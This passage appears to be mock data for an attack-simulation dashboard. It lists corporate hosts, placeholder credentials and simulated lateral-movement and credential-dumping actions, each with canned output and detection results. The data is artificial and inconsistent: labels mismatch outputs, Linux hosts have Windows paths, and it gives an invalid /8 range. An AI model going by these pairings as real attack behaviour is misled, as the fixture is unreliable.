      node_accessed_files:['C:\\Logs\\MONITOR-13-audit.log'],
      node_credentials_found:['CORP\\monitor13:P@ss13!'],
    node_agents:['sentinel_one'],
    },
    { node_id:'s530EP-ep14', node_type:'ASSET', node_label:'VPN-14', node_hostname:'VPN-14',
      node_ip:'10.10.1.63', node_platform:'Windows Server 2019', node_status:'detected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_is_pivot:true,
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s530EP-ep15', node_type:'ASSET', node_label:'SIEM-15', node_hostname:'SIEM-15',
      node_ip:'10.10.1.64', node_platform:'CentOS 7', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_accessed_files:['C:\\Logs\\SIEM-15-audit.log'],
      node_credentials_found:['CORP\\siem15:P@ss15!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s530EP-ep16', node_type:'ASSET', node_label:'WEB-16', node_hostname:'WEB-16',
      node_ip:'10.10.1.65', node_platform:'Red Hat 8', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_accessed_files:['C:\\Logs\\WEB-16-audit.log'],
      node_credentials_found:['CORP\\web16:P@ss16!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s530EP-ep17', node_type:'ASSET', node_label:'APP-17', node_hostname:'APP-17',
      node_ip:'10.10.1.66', node_platform:'Windows 11', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\APP-17-audit.log'],
      node_credentials_found:['CORP\\app17:P@ss17!'],
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s530EP-ep18', node_type:'ASSET', node_label:'DB-18', node_hostname:'DB-18',
      node_ip:'10.10.1.67', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
    node_agents:['sentinel_one'],
    },
    { node_id:'s530EP-ep19', node_type:'ASSET', node_label:'FILE-19', node_hostname:'FILE-19',
      node_ip:'10.10.1.68', node_platform:'Red Hat 8', node_status:'prevented',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
    node_agents:['openaev'],
    },
    { node_id:'s530EP-ep20', node_type:'ASSET', node_label:'MAIL-20', node_hostname:'MAIL-20',
      node_ip:'10.10.1.69', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
    node_agents:['openaev'],
    },
    { node_id:'s530EP-ep21', node_type:'ASSET', node_label:'JUMP-21', node_hostname:'JUMP-21',
      node_ip:'10.10.2.30', node_platform:'Windows Server 2019', node_status:'prevented',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s530EP-ep22', node_type:'ASSET', node_label:'PRINT-22', node_hostname:'PRINT-22',
      node_ip:'10.10.2.31', node_platform:'Red Hat 8', node_status:'detected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s530EP-ep23', node_type:'ASSET', node_label:'DNS-23', node_hostname:'DNS-23',
      node_ip:'10.10.2.32', node_platform:'Windows 11', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\DNS-23-audit.log'],
      node_credentials_found:['CORP\\dns23:P@ss23!'],
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s530EP-ep24', node_type:'ASSET', node_label:'DC-24', node_hostname:'DC-24',
      node_ip:'10.10.2.33', node_platform:'Ubuntu 20.04 LTS', node_status:'detected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_accessed_files:['C:\\Logs\\DC-24-audit.log'],
      node_credentials_found:['CORP\\dc24:P@ss24!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s530EP-ep25', node_type:'ASSET', node_label:'WS-25', node_hostname:'WS-25',
      node_ip:'10.10.2.34', node_platform:'Red Hat 8', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
    node_agents:['palo_alto', 'sentinel_one'],
    },
    { node_id:'s530EP-ep26', node_type:'ASSET', node_label:'API-26', node_hostname:'API-26',
      node_ip:'10.10.2.35', node_platform:'Red Hat 8', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\API-26-audit.log'],
      node_credentials_found:['CORP\\api26:P@ss26!'],
    node_agents:['palo_alto', 'sentinel_one'],
    },
    { node_id:'s530EP-ep27', node_type:'ASSET', node_label:'BACKUP-27', node_hostname:'BACKUP-27',
      node_ip:'10.10.2.36', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_accessed_files:['C:\\Logs\\BACKUP-27-audit.log'],
      node_credentials_found:['CORP\\backup27:P@ss27!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s530EP-ep28', node_type:'ASSET', node_label:'MONITOR-28', node_hostname:'MONITOR-28',
      node_ip:'10.10.2.37', node_platform:'CentOS 7', node_status:'detected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s530EP-ep29', node_type:'ASSET', node_label:'VPN-29', node_hostname:'VPN-29',
      node_ip:'10.10.2.38', node_platform:'Windows Server 2019', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_is_pivot:true,
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s530EP-ep30', node_type:'ASSET', node_label:'SIEM-30', node_hostname:'SIEM-30',
      node_ip:'10.10.2.39', node_platform:'Red Hat 8', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\SIEM-30-audit.log'],
      node_credentials_found:['CORP\\siem30:P@ss30!'],
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s530EP-a01', node_type:'ACTION', node_label:'nmap — Host Discovery (30 targets)',
      node_status:'undetected', node_hostname:'WEB-01', node_ip:'172.16.0.10',
      node_payload_name:'nmap-discovery', node_user_privileges:'root',
      node_executed_at:'2026-05-20 08:00:00 UTC', node_agent:'openaev',
      node_terminal_output:'Starting Nmap 30-host scan...\nHost 172.16.0.10 is up (0.003s latency).\n22/tcp open ssh\n445/tcp open microsoft-ds\n30 hosts scanned.',
    },
    { node_id:'s530EP-a02', node_type:'ACTION', node_label:'reg-sam-dump → APP-02',
      node_status:'detected', node_hostname:'APP-02', node_ip:'172.16.0.11',
      node_payload_name:'reg-sam-dump', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 08:08:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] reg-sam-dump → APP-02 (172.16.0.11)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\app02:P@ss02!'],
      node_accessed_files:['C:\\Logs\\APP-02-audit.log'],
      node_expectations:[{expectation_id:'s530EP-e01',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s530EP-a03', node_type:'ACTION', node_label:'Rubeus-asktgt → DB-03',
      node_status:'undetected', node_hostname:'DB-03', node_ip:'172.16.0.12',
      node_payload_name:'Rubeus-asktgt', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 08:12:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] Rubeus-asktgt → DB-03 (172.16.0.12)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\db03:P@ss03!'],
      node_accessed_files:['C:\\Logs\\DB-03-audit.log'],
    },
    { node_id:'s530EP-a04', node_type:'ACTION', node_label:'PrintNightmare-LPE → FILE-04',
      node_status:'undetected', node_hostname:'FILE-04', node_ip:'172.16.0.13',
      node_payload_name:'PrintNightmare-LPE', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 08:15:00 UTC', node_agent:'openaev',
      node_terminal_output:`[nuclei] CVE-2021-34527 (PrintNightmare) [critical]
[*] Target: FILE-04 (172.16.0.13)
[+] Windows Print Spooler detected (spoolsv.exe)
[+] RCE via AddPrinterDriverEx() - arbitrary DLL load
[+] Privilege escalated to SYSTEM
[+] Host fully compromised`,
      node_credentials_found:['CORP\\file04:P@ss04!'],
      node_accessed_files:['C:\\Logs\\FILE-04-audit.log'],
    },
    { node_id:'s530EP-a05', node_type:'ACTION', node_label:'wdigest-dump → MAIL-05',
      node_status:'undetected', node_hostname:'MAIL-05', node_ip:'172.16.0.14',
      node_payload_name:'wdigest-dump', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 08:23:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] wdigest-dump → MAIL-05 (172.16.0.14)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\mail05:P@ss05!'],
      node_accessed_files:['C:\\Logs\\MAIL-05-audit.log'],
    },
    { node_id:'s530EP-a06', node_type:'ACTION', node_label:'PowerView-recon → JUMP-06',
      node_status:'detected', node_hostname:'JUMP-06', node_ip:'172.16.0.15',
      node_payload_name:'PowerView-recon', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 08:26:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] PowerView-recon → JUMP-06 (172.16.0.15)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\jump06:P@ss06!'],
      node_accessed_files:['C:\\Logs\\JUMP-06-audit.log'],
      node_expectations:[{expectation_id:'s530EP-e05',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s530EP-a07', node_type:'ACTION', node_label:'psexec-lateral → PRINT-07',
      node_status:'undetected', node_hostname:'PRINT-07', node_ip:'172.16.0.16',
      node_payload_name:'psexec-lateral', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 08:31:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:`[nuclei] CVE-2021-34527 (PrintNightmare) [critical]
[*] Target: PRINT-07 (172.16.0.16)
[+] Windows Print Spooler detected (spoolsv.exe)
[+] RCE via AddPrinterDriverEx() - arbitrary DLL load
[+] Privilege escalated to SYSTEM
[+] Host fully compromised`,
      node_credentials_found:['CORP\\print07:P@ss07!'],
      node_accessed_files:['C:\\Logs\\PRINT-07-audit.log'],
    },
    { node_id:'s530EP-a08', node_type:'ACTION', node_label:'CrackMapExec → DNS-08',
      node_status:'undetected', node_hostname:'DNS-08', node_ip:'172.16.0.17',
      node_payload_name:'CrackMapExec', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 08:36:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] CrackMapExec → DNS-08 (172.16.0.17)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\dns08:P@ss08!'],
      node_accessed_files:['C:\\Logs\\DNS-08-audit.log'],
    },
    { node_id:'s530EP-a09', node_type:'ACTION', node_label:'psexec-lateral → DC-09',
      node_status:'undetected', node_hostname:'DC-09', node_ip:'172.16.0.18',
      node_payload_name:'psexec-lateral', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 08:42:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] psexec-lateral → DC-09 (172.16.0.18)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\dc09:P@ss09!'],
      node_accessed_files:['C:\\Logs\\DC-09-audit.log'],
    },
    { node_id:'s530EP-a10', node_type:'ACTION', node_label:'wdigest-dump → WS-10',
      node_status:'undetected', node_hostname:'WS-10', node_ip:'172.16.0.19',
      node_payload_name:'wdigest-dump', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 08:45:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] wdigest-dump → WS-10 (172.16.0.19)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\ws10:P@ss10!'],
      node_accessed_files:['C:\\Logs\\WS-10-audit.log'],
    },
    { node_id:'s530EP-a11', node_type:'ACTION', node_label:'netexec-smb-spray → API-11',
      node_status:'prevented', node_hostname:'API-11', node_ip:'10.10.1.60',
      node_payload_name:'netexec-smb-spray', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 08:51:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] netexec-smb-spray → API-11 (10.10.1.60)\n[-] BLOCKED by endpoint protection\n[!] Prevented at API-11',
      node_expectations:[{expectation_id:'s530EP-e10',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s530EP-a12', node_type:'ACTION', node_label:'DCSync-krbtgt → BACKUP-12',
      node_status:'undetected', node_hostname:'BACKUP-12', node_ip:'10.10.1.61',
      node_payload_name:'DCSync-krbtgt', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 08:56:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] DCSync-krbtgt → BACKUP-12 (10.10.1.61)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\backup12:P@ss12!'],
      node_accessed_files:['C:\\Logs\\BACKUP-12-audit.log'],
    },
    { node_id:'s530EP-a13', node_type:'ACTION', node_label:'PowerView-recon → MONITOR-13',
      node_status:'undetected', node_hostname:'MONITOR-13', node_ip:'10.10.1.62',
      node_payload_name:'PowerView-recon', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 09:03:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] PowerView-recon → MONITOR-13 (10.10.1.62)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\monitor13:P@ss13!'],
      node_accessed_files:['C:\\Logs\\MONITOR-13-audit.log'],
    },
    { node_id:'s530EP-a14', node_type:'ACTION', node_label:'reg-sam-dump → VPN-14',
      node_status:'detected', node_hostname:'VPN-14', node_ip:'10.10.1.63',
      node_payload_name:'reg-sam-dump', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 09:08:00 UTC', node_agent:'palo_alto',
      node_terminal_output:`Starting Nmap 7.94 ( https://nmap.org ) at 2026-05-20 08:00 UTC
Nmap scan report for VPN-14 (10.10.1.63)
Host is up (0.003s latency).
22/tcp   open  ssh
443/tcp  open  https
1194/udp open  openvpn
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds`,
      node_credentials_found:['CORP\\vpn14:P@ss14!'],
      node_accessed_files:['C:\\Logs\\VPN-14-audit.log'],
      node_expectations:[{expectation_id:'s530EP-e13',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s530EP-a15', node_type:'ACTION', node_label:'PowerView-recon → SIEM-15',
      node_status:'undetected', node_hostname:'SIEM-15', node_ip:'10.10.1.64',
      node_payload_name:'PowerView-recon', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 09:13:00 UTC', node_agent:'palo_alto',
      node_terminal_output:`[nuclei] CVE-2021-44228 (Log4Shell) [critical]
[*] Target: SIEM-15 (10.10.1.64)
[+] Vulnerable log4j-2.14.1 detected
[+] JNDI injection via User-Agent header
[+] DNS callback confirmed RCE
[+] Shell obtained as root`,
      node_credentials_found:['CORP\\siem15:P@ss15!'],
      node_accessed_files:['C:\\Logs\\SIEM-15-audit.log'],
    },
    { node_id:'s530EP-a16', node_type:'ACTION', node_label:'Rubeus-asktgt → WEB-16',
      node_status:'undetected', node_hostname:'WEB-16', node_ip:'10.10.1.65',
      node_payload_name:'Rubeus-asktgt', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 09:16:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] Rubeus-asktgt → WEB-16 (10.10.1.65)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\web16:P@ss16!'],
      node_accessed_files:['C:\\Logs\\WEB-16-audit.log'],
    },
    { node_id:'s530EP-a17', node_type:'ACTION', node_label:'nmap-discovery → APP-17',
      node_status:'undetected', node_hostname:'APP-17', node_ip:'10.10.1.66',
      node_payload_name:'nmap-discovery', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 09:20:00 UTC', node_agent:'openaev',
      node_terminal_output:`Starting Nmap 7.94 ( https://nmap.org ) at 2026-05-20 08:00 UTC
Nmap scan report for APP-17 (10.10.1.66)
Host is up (0.003s latency).
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds`,
      node_credentials_found:['CORP\\app17:P@ss17!'],
      node_accessed_files:['C:\\Logs\\APP-17-audit.log'],
    },
    { node_id:'s530EP-a18', node_type:'ACTION', node_label:'SharpHound → DB-18',
      node_status:'undetected', node_hostname:'DB-18', node_ip:'10.10.1.67',
      node_payload_name:'SharpHound', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 09:25:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] SharpHound → DB-18 (10.10.1.67)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\db18:P@ss18!'],
      node_accessed_files:['C:\\Logs\\DB-18-audit.log'],
    },
    { node_id:'s530EP-a19', node_type:'ACTION', node_label:'wdigest-dump → FILE-19',
      node_status:'prevented', node_hostname:'FILE-19', node_ip:'10.10.1.68',
      node_payload_name:'wdigest-dump', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 09:33:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] wdigest-dump → FILE-19 (10.10.1.68)\n[-] BLOCKED by endpoint protection\n[!] Prevented at FILE-19',
      node_expectations:[{expectation_id:'s530EP-e18',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s530EP-a20', node_type:'ACTION', node_label:'pass-the-hash → MAIL-20',
      node_status:'undetected', node_hostname:'MAIL-20', node_ip:'10.10.1.69',
      node_payload_name:'pass-the-hash', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 09:37:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] pass-the-hash → MAIL-20 (10.10.1.69)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\mail20:P@ss20!'],
      node_accessed_files:['C:\\Logs\\MAIL-20-audit.log'],
    },
    { node_id:'s530EP-a21', node_type:'ACTION', node_label:'PowerView-recon → JUMP-21',
      node_status:'prevented', node_hostname:'JUMP-21', node_ip:'10.10.2.30',
      node_payload_name:'PowerView-recon', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 09:43:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] PowerView-recon → JUMP-21 (10.10.2.30)\n[-] BLOCKED by endpoint protection\n[!] Prevented at JUMP-21',
      node_expectations:[{expectation_id:'s530EP-e20',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s530EP-a22', node_type:'ACTION', node_label:'PowerView-recon → PRINT-22',
      node_status:'detected', node_hostname:'PRINT-22', node_ip:'10.10.2.31',
      node_payload_name:'PowerView-recon', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 09:46:00 UTC', node_agent:'palo_alto',
      node_terminal_output:`[nuclei] CVE-2022-26134 (Confluence RCE) [critical]
[*] Target: PRINT-22 (10.10.2.31)
[+] Atlassian Confluence 7.18.0 detected
[+] OGNL injection via URI path
[+] Command execution: uid=confluence
[+] Credentials from DB config`,
      node_credentials_found:['CORP\\print22:P@ss22!'],
      node_accessed_files:['C:\\Logs\\PRINT-22-audit.log'],
      node_expectations:[{expectation_id:'s530EP-e21',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s530EP-a23', node_type:'ACTION', node_label:'SharpHound → DNS-23',
      node_status:'undetected', node_hostname:'DNS-23', node_ip:'10.10.2.32',
      node_payload_name:'SharpHound', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 09:52:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] SharpHound → DNS-23 (10.10.2.32)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\dns23:P@ss23!'],
      node_accessed_files:['C:\\Logs\\DNS-23-audit.log'],
    },
    { node_id:'s530EP-a24', node_type:'ACTION', node_label:'psexec-lateral → DC-24',
      node_status:'detected', node_hostname:'DC-24', node_ip:'10.10.2.33',
      node_payload_name:'psexec-lateral', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 09:56:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:`Starting Nmap 7.94 ( https://nmap.org ) at 2026-05-20 08:00 UTC
Nmap scan report for DC-24 (10.10.2.33)
Host is up (0.003s latency).
53/tcp   open  domain
88/tcp   open  kerberos-sec
389/tcp  open  ldap
445/tcp  open  microsoft-ds
636/tcp  open  ldapssl

Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds`,
      node_credentials_found:['CORP\\dc24:P@ss24!'],
      node_accessed_files:['C:\\Logs\\DC-24-audit.log'],
      node_expectations:[{expectation_id:'s530EP-e23',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s530EP-a25', node_type:'ACTION', node_label:'CrackMapExec → WS-25',
      node_status:'undetected', node_hostname:'WS-25', node_ip:'10.10.2.34',
      node_payload_name:'CrackMapExec', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 10:02:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] CrackMapExec → WS-25 (10.10.2.34)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\ws25:P@ss25!'],
      node_accessed_files:['C:\\Logs\\WS-25-audit.log'],
    },
    { node_id:'s530EP-a26', node_type:'ACTION', node_label:'psexec-lateral → API-26',
      node_status:'undetected', node_hostname:'API-26', node_ip:'10.10.2.35',
      node_payload_name:'psexec-lateral', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 10:05:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] psexec-lateral → API-26 (10.10.2.35)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\api26:P@ss26!'],
      node_accessed_files:['C:\\Logs\\API-26-audit.log'],
    },
    { node_id:'s530EP-a27', node_type:'ACTION', node_label:'reg-sam-dump → BACKUP-27',
      node_status:'undetected', node_hostname:'BACKUP-27', node_ip:'10.10.2.36',
      node_payload_name:'reg-sam-dump', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 10:13:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] reg-sam-dump → BACKUP-27 (10.10.2.36)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\backup27:P@ss27!'],
      node_accessed_files:['C:\\Logs\\BACKUP-27-audit.log'],
    },
    { node_id:'s530EP-a28', node_type:'ACTION', node_label:'Rubeus-asktgt → MONITOR-28',
      node_status:'detected', node_hostname:'MONITOR-28', node_ip:'10.10.2.37',
      node_payload_name:'Rubeus-asktgt', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 10:15:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:`[nuclei] CVE-2022-22965 (Spring4Shell) [critical]
[*] Target: MONITOR-28 (10.10.2.37)
[+] Spring Framework 5.3.17 detected
[+] DataBinder classLoader hijacking
[+] JSP webshell uploaded
[+] RCE confirmed as tomcat -> root`,
      node_credentials_found:['CORP\\monitor28:P@ss28!'],
      node_accessed_files:['C:\\Logs\\MONITOR-28-audit.log'],
      node_expectations:[{expectation_id:'s530EP-e27',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s530EP-a29', node_type:'ACTION', node_label:'pass-the-hash → VPN-29',
      node_status:'undetected', node_hostname:'VPN-29', node_ip:'10.10.2.38',
      node_payload_name:'pass-the-hash', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 10:22:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] pass-the-hash → VPN-29 (10.10.2.38)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\vpn29:P@ss29!'],
      node_accessed_files:['C:\\Logs\\VPN-29-audit.log'],
    },
    { node_id:'s530EP-a30', node_type:'ACTION', node_label:'reg-sam-dump → SIEM-30',
      node_status:'undetected', node_hostname:'SIEM-30', node_ip:'10.10.2.39',
      node_payload_name:'reg-sam-dump', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 10:27:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] reg-sam-dump → SIEM-30 (10.10.2.39)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\siem30:P@ss30!'],
      node_accessed_files:['C:\\Logs\\SIEM-30-audit.log'],
    },
    {
      node_id: 's530EP-a-nmap-bulk', node_type: 'ACTION', node_label: 'Nmap Full-Network Discovery',
      node_status: 'undetected', node_ip: '172.16.0.0/8',
      node_payload_name: 'nmap – TCP SYN Scan (full network)',
      node_executed_at: '2026-05-20 07:55:00 UTC',
      node_agent: 'openaev',
      node_terminal_output: `Starting Nmap 7.94 at 2026-05-20 07:55 UTC
Nmap scan report for 172.16.0.11 (APP-02)
HOST: up
22/tcp  open  ssh
8080/tcp open  http

Nmap scan report for 172.16.0.12 (DB-03)
HOST: up
22/tcp  open  ssh
5432/tcp open  postgresql

Nmap scan report for 172.16.0.13 (FILE-04)
HOST: up
22/tcp  open  ssh
2049/tcp open  nfs

Nmap scan report for 172.16.0.14 (MAIL-05)
HOST: up
25/tcp  open  smtp
22/tcp  open  ssh

Nmap scan report for 172.16.0.15 (JUMP-06)
HOST: up
22/tcp  open  ssh
3389/tcp open  ms-wbt-server

Nmap scan report for 172.16.0.16 (PRINT-07)
HOST: up
135/tcp open  msrpc
9100/tcp open  jetdirect

Nmap scan report for 172.16.0.17 (DNS-08)
HOST: up
53/tcp  open  domain
22/tcp  open  ssh

Nmap scan report for 172.16.0.18 (DC-09)
HOST: up
53/tcp  open  domain
88/tcp  open  kerberos-sec
389/tcp open  ldap
445/tcp open  microsoft-ds

Nmap scan report for 172.16.0.19 (WS-10)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 10.10.1.60 (API-11)
HOST: up
22/tcp  open  ssh
8080/tcp open  http

Nmap scan report for 10.10.1.61 (BACKUP-12)
HOST: up
22/tcp  open  ssh
873/tcp open  rsync

Nmap scan report for 10.10.1.62 (MONITOR-13)
HOST: up
22/tcp  open  ssh
9200/tcp open  elasticsearch

Nmap scan report for 10.10.1.63 (VPN-14)
HOST: up
1194/tcp open  openvpn
135/tcp  open  msrpc

Nmap scan report for 10.10.1.64 (SIEM-15)
HOST: up
22/tcp  open  ssh
5601/tcp open  kibana

Nmap scan report for 10.10.1.65 (WEB-16)
HOST: up
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  ssl/https

Nmap scan report for 10.10.1.66 (APP-17)
HOST: up
22/tcp  open  ssh
8080/tcp open  http

Nmap scan report for 10.10.1.67 (DB-18)
HOST: up
22/tcp  open  ssh
3306/tcp open  mysql

Nmap scan report for 10.10.1.68 (FILE-19)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.10.1.69 (MAIL-20)
HOST: up
25/tcp  open  smtp
143/tcp open  imap

Nmap scan report for 10.10.2.30 (JUMP-21)
HOST: up
135/tcp open  msrpc
3389/tcp open  ms-wbt-server

Nmap scan report for 10.10.2.31 (PRINT-22)
HOST: up
135/tcp open  msrpc
9100/tcp open  jetdirect

Nmap scan report for 10.10.2.32 (DNS-23)
HOST: up
53/tcp  open  domain
445/tcp open  microsoft-ds

Nmap scan report for 10.10.2.33 (DC-24)
HOST: up
53/tcp  open  domain
88/tcp  open  kerberos-sec
389/tcp open  ldap
445/tcp open  microsoft-ds

Nmap scan report for 10.10.2.34 (WS-25)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.10.2.35 (API-26)
HOST: up
22/tcp  open  ssh
8443/tcp open  https-alt

Nmap scan report for 10.10.2.36 (BACKUP-27)
HOST: up
22/tcp  open  ssh
873/tcp open  rsync

Nmap scan report for 10.10.2.37 (MONITOR-28)
HOST: up
22/tcp  open  ssh
9200/tcp open  elasticsearch

Nmap scan report for 10.10.2.38 (VPN-29)
HOST: up
22/tcp  open  ssh
1194/tcp open  openvpn

